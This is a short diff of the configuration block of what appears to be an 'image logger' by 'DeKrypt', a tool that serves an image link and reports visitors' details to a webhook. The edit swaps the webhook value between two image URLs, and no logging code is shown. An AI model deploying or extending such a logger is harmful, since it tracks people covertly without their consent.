@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://www.webassetscdn.com/avira/prod-blog/wp-content/uploads/2016/08/avira_blog_mr.robot-header.jpg",
+    "webhook": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQQ6axtQRe2zhVk9Ztl53uePfb1txs0vqYPWZJsmGSLR99SvGn3xUyckss&s=10",
     "image": "https://i.pinimg.com/736x/1f/87/cc/1f87ccaafd48e6b2156a1d6a826467a7.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
